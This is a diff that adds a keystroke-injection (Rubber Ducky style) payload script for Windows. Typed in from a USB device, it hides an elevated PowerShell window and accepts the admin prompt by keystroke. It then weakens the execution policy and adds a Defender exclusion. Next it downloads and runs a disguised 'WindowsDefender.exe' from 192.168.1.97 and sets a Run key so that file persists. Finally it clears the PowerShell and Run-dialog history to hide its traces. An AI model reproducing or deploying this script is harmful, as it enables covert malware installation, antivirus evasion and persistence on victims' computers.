@@ -1,0 +1,50 @@
+REM Open Run Dialog Box
+DELAY 1000
+GUI r
+DELAY 100
+
+REM Open admin PowerShell with smallest window, exit if fails
+STRING powershell -Command "try { Start-Process powershell -Verb runAs -ArgumentList '-NoExit -Command \"(Get-Host).UI.RawUI.BufferSize = (Get-Host).UI.RawUI.WindowSize = [System.Management.Automation.Host.Size]::new(1,1)\"' -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 4000
+ALT y
+DELAY 3000
+
+REM Set Execution Policy Unrestricted, exit if fails
+STRING powershell -Command "try { Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Add Defender exclusion, exit if fails
+STRING powershell -Command "try { Add-MpPreference -ExclusionPath 'C:\Windows\Defender' -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Download payload, exit if fails
+STRING powershell -Command "try { New-Item -Path 'C:\Windows\Defender' -ItemType Directory -ErrorAction SilentlyContinue; Invoke-WebRequest 'http://192.168.1.97/WindowsDefender.exe' -OutFile 'C:\Windows\Defender\WindowsDefender.exe' -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Set autorun registry key, exit if fails
+STRING powershell -Command "try { Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefender.exe' -Value 'C:\Windows\Defender\WindowsDefender.exe' -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Run downloaded script, exit if fails
+STRING powershell -Command "try { Start-Process -FilePath 'C:\Windows\Defender\WindowsDefender.exe' -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Clear PowerShell history
+STRING powershell -Command "try { Clear-History } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Clear Run dialog history
+STRING powershell -Command "try { Remove-Item -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Recurse -ErrorAction Stop } catch { exit 1 }"
+ENTER
+DELAY 100
+
+REM Exit PowerShell
+STRING exit
+ENTER
